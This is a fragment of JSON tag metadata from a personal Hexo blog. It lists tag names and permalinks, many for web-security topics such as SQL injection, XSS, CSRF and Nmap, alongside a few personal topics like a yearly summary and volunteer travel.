年度总结","slug":"2020-年度总结","permalink":"http://yejuns.github.io/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"},{"name":"Linux、安全","slug":"Linux、安全","permalink":"http://yejuns.github.io/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/"},{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"},{"name":"bwapp、injection","slug":"bwapp、injection","permalink":"http://yejuns.github.io/tags/bwapp%E3%80%81injection/"},{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"},{"name":"CSRF 、攻击","slug":"CSRF-、攻击","permalink":"http://yejuns.github.io/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/"},{"name":"web安全、Nmap","slug":"web安全、Nmap","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/"},{"name":"xss、攻击","slug":"xss、攻击","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"堆叠注入、OOB注入","slug":"堆叠注入、OOB注入","permalink":"http://yejuns.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/"},{"name":"web、php、注入、RCE","slug":"web、php、注入、RCE","permalink":"http://yejuns.github.io/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/"},{"name":"xss、攻击、蠕虫","slug":"xss、攻击、蠕虫","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/"},{"name":"伪协议、文件包含","slug":"伪协议、文件包含","permalink":"http://yejuns.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"windows，指令","slug":"windows，指令","permalink":"http://yejuns.github.io/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/"},{"name":"xss、靶场、题解","slug":"xss、靶场、题解","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"fiddler,","slug":"fiddler","permalink":"http://yejuns.github.io/tags/fiddler/"},{"name":"义工旅行","slug":"义工旅行","permalink":"http://yejuns.github.io/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/"},{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"},{"name":"Android、逆向","slug":"Android、逆向","permalink":"http://yejuns.github.io/tags/Android%E3%80%81%E9%80%86%E5%90%91/"}]}